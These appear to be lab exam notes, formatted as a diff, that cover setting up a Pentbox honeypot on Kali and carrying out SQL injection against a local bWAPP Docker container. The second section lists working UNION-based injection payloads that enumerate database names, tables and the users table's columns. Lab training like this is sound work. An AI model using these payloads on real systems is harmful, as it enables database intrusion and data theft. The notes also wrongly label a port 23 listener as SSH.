@@ -1,0 +1,206 @@
+1) Honeypot using Pentbox (Simple Lab Exam Steps)
+Aim:
+
+Set up a honeypot using Pentbox and monitor suspicious connections.
+
+A) Fast Configuration – Monitor Port 80
+Step 1: Open Kali Linux Terminal
+Step 2: Download Pentbox
+git clone https://github.com/technicaldada/pentbox.git
+Step 3: Open Folder
+cd pentbox
+ls
+
+If tar file exists:
+
+tar xvzf pentbox.tar.gz
+cd pentbox-1.8
+Step 4: Run Pentbox
+./pentbox.rb
+Step 5: Select Options
+Press 2 → Network Tools
+Press 3 → Honeypots
+Press 1 → Fast Auto Configuration
+What Happens After Execution:
+Honeypot starts automatically on Port 80
+Waits for attacker/request traffic
+Step 6: Check Your IP
+
+Open another terminal:
+
+ifconfig
+
+Example IP:
+
+10.0.2.15
+Step 7: Test Honeypot
+
+Open browser and type:
+
+http://10.0.2.15
+Output on Pentbox:
+INTRUSION ATTEMPT DETECTED!
+GET / HTTP/1.1
+Host: 10.0.2.15
+User-Agent: Firefox
+Result:
+
+Port 80 honeypot successfully detected web access attempt.
+
+B) Manual Configuration – Monitor SSH Connection using PuTTY
+Step 1: Install SSH in Kali
+sudo apt update
+sudo apt install openssh-server
+sudo systemctl start ssh
+sudo systemctl enable ssh
+sudo systemctl status ssh
+Step 2: Run Pentbox Again
+./pentbox.rb
+Step 3: Choose Options
+2 → Network Tools
+3 → Honeypots
+2 → Manual Configuration
+Step 4: Enter Values
+Insert port to open: 23
+Insert false message: hi
+Net option 1: n
+Net option 2: y
+Output:
+Your honeypot is activated at port 23
+Step 5: Open PuTTY from Windows
+Host Name = Kali IP
+Port = 23
+What Happens:
+
+When PuTTY connects:
+
+Pentbox shows:
+
+INTRUSION DETECTED
+Connection received on port 23
+Result:
+
+Manual honeypot detected SSH/Telnet style remote connection attempt.
+
+2) SQL Injection using bWAPP in Docker (GET/Search Hack)
+Aim:
+
+Demonstrate SQL Injection in controlled Docker lab.
+
+Step 1: Open Docker Desktop
+
+Run as Administrator.
+
+Step 2: Open PowerShell Admin
+
+Create folder:
+
+mkdir bwapp
+cd bwapp
+Step 3: Pull bWAPP Image
+docker pull raesene/bwapp
+Step 4: Run Container
+docker run -d -p 80:80 raesene/bwapp
+Step 5: Open Browser
+http://localhost
+Step 6: Install bWAPP
+
+Open:
+
+http://localhost/bWAPP/install.php
+
+Click Install
+
+Step 7: Login
+Username: bee
+Password: bug
+
+GET(Search) Hack Steps
+Step 1:
+
+Inside bWAPP:
+
+Choose Bug:
+
+SQL Injection (GET/Search)
+Step 2: Normal Search
+
+Search:
+
+spider
+
+Shows movie results.
+
+Search:
+
+spiderman
+
+May show:
+
+No movies found
+Step 3: Injection Test
+
+Enter:
+
+spider1' -- -
+Output:
+
+This breaks SQL query and confirms vulnerability.
+
+URL becomes:
+
+sqli_1.php?title=spider1%27+--+-&action=search
+Step 4: Find Number of Columns
+
+Search:
+
+spider1' order by 5 -- -
+
+Then try:
+
+order by 6
+order by 7
+order by 8
+
+If 8 gives error:
+
+Result:
+
+Table has 7 columns
+
+Step 5: Display Columns
+
+Search:
+
+spi1' union select 1,2,3,4,5,6,7 -- -
+Output:
+
+Numbers appear on screen showing injectable columns.
+
+Step 6: Get Database Name
+spi1' union select 1,database(),3,4,5,6,7 -- -
+Output:
+bWAPP
+Step 7: Get Version
+spi1' union select 1,database(),version(),4,5,6,7 -- -
+Output Example:
+MySQL version shown
+Step 8: Get Table Names
+sp1' union select 1,table_name,3,4,5,6,7 from information_schema.tables -- -
+Output:
+movies
+users
+blog
+Step 9: Get Column Names
+sp1' union select 1,2,3,4,group_concat(column_name),6,7 from information_schema.columns where table_name='users' -- -
+Output:
+id,login,password,email,...
+Step 10: Retrieve Data
+sp1' union select 1,2,3,4,group_concat(id,title),6,7 from movies -- -
+Output:
+
+Movie IDs and titles displayed.
+
+Result:
+
+Successfully demonstrated SQL Injection in local lab environment.
